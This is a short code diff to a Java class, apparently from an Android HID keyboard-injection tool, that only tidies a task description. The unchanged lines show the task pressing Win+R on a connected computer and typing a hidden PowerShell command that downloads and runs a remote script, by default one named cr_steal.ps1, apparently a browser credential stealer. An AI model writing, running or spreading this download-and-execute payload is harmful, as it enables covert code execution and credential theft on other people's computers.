@@ -14,7 +14,7 @@ import static cf.netdex.hidfuzzer.hid.Input.KB;
 
 public class PowershellTask extends HIDTask {
     public PowershellTask(Context context) {
-        super(context);
+        super(context, "Runs a PowerShell script.");
     }
 
     @Override
@@ -24,7 +24,6 @@ public class PowershellTask extends HIDTask {
 
         final HIDR h = this.getHIDR();
 
-        say("Run PowerShell script.");
         String file = ask("PowerShell script?", "https://netdex.cf/s/cr_steal/cr_steal.ps1");
 
         while (!isCancelled()) {
@@ -40,6 +39,7 @@ public class PowershellTask extends HIDTask {
             h.press_keys(KB.M.LSUPER.c, KB.K.R.c);
             h.delay(2000);
             h.send_string("powershell -WindowStyle Hidden iex ((new-object net.webclient).downloadstring('" + file + "'))\n");
+
             publishProgress(RunState.DONE);
             while (!isCancelled() && h.test() == 0) {
                 h.delay(1000);
